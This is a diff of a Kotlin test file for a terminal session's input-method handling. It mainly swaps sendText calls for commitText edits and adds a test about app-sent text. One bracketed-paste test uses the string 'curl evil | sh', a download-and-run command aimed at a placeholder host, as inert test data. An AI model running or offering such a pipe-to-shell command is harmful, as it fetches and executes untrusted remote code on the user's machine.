@@ -242,7 +242,7 @@ class TerminalSessionTest {
     fun aNewLineAtTheBottomResetsTheIme() {
         feed("\u001b[5H")
         restarts = 0
-        session.sendText("ls")
+        session.edit { it.commitText("ls") }
         feed("ls")
         feed("\r\n$ ")
         assertEquals(1, restarts)
@@ -251,7 +251,7 @@ class TerminalSessionTest {
 
     @Test
     fun outputOnAnotherLineResetsTheImeEvenIfTheCursorComesBack() {
-        session.sendText("ls")
+        session.edit { it.commitText("ls") }
         feed("ls")
         feed("\u001b7\u001b[3Hdone\u001b8")
         assertEquals(1, restarts)
@@ -260,7 +260,7 @@ class TerminalSessionTest {
 
     @Test
     fun aResetOfTheTerminalResetsTheIme() {
-        session.sendText("old")
+        session.edit { it.commitText("old") }
         feed("old")
         feed("\u001bc")
         assertEquals(1, restarts)
@@ -272,7 +272,7 @@ class TerminalSessionTest {
 
     @Test
     fun goingToTheAlternateScreenAndBackInOneFeedResetsTheIme() {
-        session.sendText("old")
+        session.edit { it.commitText("old") }
         feed("old")
         feed("\u001b[?1049h\u001b[?1049l")
         assertEquals(1, restarts)
@@ -413,7 +413,7 @@ class TerminalSessionTest {
 
     @Test
     fun armingStickyModifiersWithoutComposingTextDoesNotRestartTheIme() {
-        session.sendText("ab")
+        session.edit { it.commitText("ab") }
         session.stickyModifiers = KeyModifiers.of(ctrl = true)
         session.stickyModifiers = KeyModifiers.None
         assertEquals("ab", session.edit { it.text })
@@ -445,6 +445,13 @@ class TerminalSessionTest {
         feed("\u001b[?2004h")
         session.edit { it.commitText("echo hi\ncurl evil | sh\n") }
         assertEquals("\u001b[200~echo hi\rcurl evil | sh\r\u001b[201~", sent.toString())
+    }
+
+    @Test
+    fun textThatTheAppSendsIsNotShownToTheIme() {
+        session.sendText("hunter2")
+        assertEquals("hunter2", sent.toString())
+        assertEquals("", session.edit { it.textBeforeCursor(100) })
     }
 
     @Test
@@ -679,7 +686,8 @@ class TerminalSessionTest {
                 received.append(String(it, Charsets.UTF_8))
                 Thread.yield()
             })
-        val threads = List(4) { thread -> Thread { repeat(50) { typing.sendText("$thread") } } }
+        val threads =
+            List(4) { thread -> Thread { repeat(50) { typing.edit { it.commitText("$thread") } } } }
         threads.forEach { it.start() }
         threads.forEach { it.join() }
         assertEquals(200, received.length)
@@ -938,7 +946,7 @@ class TerminalSessionTest {
         session =
             TerminalSession({ failure = runCatching { session.sendText("b") }.exceptionOrNull() })
 
-        session.sendText("a")
+        session.edit { it.commitText("a") }
 
         assertIs<IllegalStateException>(failure)
         assertEquals("a", session.edit { it.text })
@@ -955,7 +963,7 @@ class TerminalSessionTest {
                 received.append(String(it, Charsets.UTF_8))
                 runCatching { session.sendText("b") }
             })
-        session.sendText("a")
+        session.edit { it.commitText("a") }
 
         session.edit { it.replaceText(0, 1, "c") }
 
